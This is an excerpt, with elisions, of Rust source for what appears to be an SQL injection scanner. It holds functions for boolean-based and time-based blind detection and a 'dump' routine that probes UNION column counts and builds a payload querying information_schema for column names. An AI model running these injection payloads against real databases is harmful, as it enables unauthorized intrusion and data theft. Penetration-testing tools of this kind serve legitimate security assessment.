...
pub async fn blind_scan(
    ...
    println!(
        "{} True condition (AND 1=1):  {} bytes, status {}",
        "[*]".cyan().bold(),
        true_len,
        true_status
    );
    println!(
        "{} False condition (AND 1=2): {} bytes, status {}",
        "[*]".cyan().bold(),
        false_len,
        false_status
    );
    ...
    if true_len != false_len {
        println!(
            "\n{} [HIGH] Boolean-based blind SQLi detected!",
            "[!]".red().bold()
        );
        println!(
            "  {} Response size differs between true/false conditions",
            "•".cyan()
        );
        println!(
            "  {} Delta: {} bytes",
            "•".cyan(),
            true_len as i64 - false_len as i64
        );
        ...
        println!(
            "  {} Response content differs despite same size",
            "•".cyan()
        );
    } else {
        println!(
            "\n{} No boolean-based blind SQLi detected.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
...
pub async fn time_scan(
    ...
    for (name, payload) in &sleep_payloads {
        ...
        if delayed {
            found = true;
            println!(
                "{} [HIGH] Time-based blind SQLi via {}!",
                "[!]".red().bold(),
                name
            );
        }
    ...
    if !found {
        println!(
            "\n{} No time-based blind SQLi detected.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
...
pub async fn dump(
    ...
    let union_payload = "1 UNION SELECT NULL,NULL,NULL,NULL--".to_string();
    let test_url = format!(
        "{}{}{}={}",
        url,
        if url.contains('?') { "&" } else { "?" },
    ...
    println!(
        "{} Testing UNION injection with column count probe...",
        "[*]".cyan().bold()
    );
    ...
    for n in 1..=10 {
        ...
        if !resp_body.is_empty() && resp_body.len() > body.len() + 50 {
            println!(
                "{} [+] UNION works with {} columns",
                "[+]".green().bold(),
                n
            );

            let dump_payload = format!(
                "1 UNION SELECT group_concat(column_name),NULL{} FROM information_schema.columns WHERE table_name='{}'--",
                ",NULL".repeat(n - 1),
                table
            );
            let dump_url = format!(
    ...
    println!(
        "{} Could not determine UNION column count.",
        "[-]".yellow().bold()
    );
    Ok(())
}
